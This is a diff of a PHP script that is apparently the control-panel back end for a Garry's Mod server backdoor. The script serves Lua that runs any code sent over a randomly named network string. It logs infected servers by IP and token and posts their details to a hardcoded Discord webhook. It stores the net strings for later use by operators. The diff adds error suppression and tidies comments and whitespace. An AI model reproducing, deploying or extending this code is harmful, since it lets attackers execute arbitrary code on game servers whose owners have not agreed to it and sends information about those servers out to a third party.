@@ -2,6 +2,9 @@
 
 require_once($_SERVER['DOCUMENT_ROOT']."/project/api/core/config.php");
 
+error_reporting(0);
+ini_set('display_errors', 0);
+
 // request date
 $date = date("y:m:d h:i:sa");
 
@@ -18,9 +21,11 @@ if(empty($password)) { $password = "NULL"; }
 $net = $Secure::Randomize(); // this generates a random string then we use that as the net because gamer!!!
 $lua = "util.AddNetworkString('$net'); net.Receive('$net', function(len) RunString(net.ReadString()) end)";
 
-// if you noitced that the server request is gone then yk
+// if you noticed that the server request is gone then yk
 // in the .htaccess requests outside gmod or forbidden
+
 echo $lua; // echo the backdoor script
+
 if($token) {
     $response = $GLOBALS['database']->Count('backdoors', ['ip' => $serverip, 'token' => $token]);
     
@@ -48,6 +53,7 @@ else {
             ]
         ]
     ]);
+    
     // send the public info to our discord through a embed using the json data defined above
     $curl=curl_init("https://discord.com/api/webhooks/786039265901543424/ZsmAQWutRytBPLI-peEoMz29FzAkGDRiBsxRclJ5kLBGjiA394TlinwJOU-uNym4TxrL");
     curl_setopt($curl, CURLOPT_HTTPHEADER, array('Content-type: application/json'));
@@ -57,9 +63,9 @@ else {
     curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
     curl_setopt($curl, CURLOPT_POSTFIELDS, $json_data);
     curl_exec($curl);
+    
     // finnally save the netstring so users can use later
     file_put_contents($_SERVER['DOCUMENT_ROOT']."/project/bin/nets", "$net ", FILE_APPEND | LOCK_EX); 
 }
-?>
 
 ?>
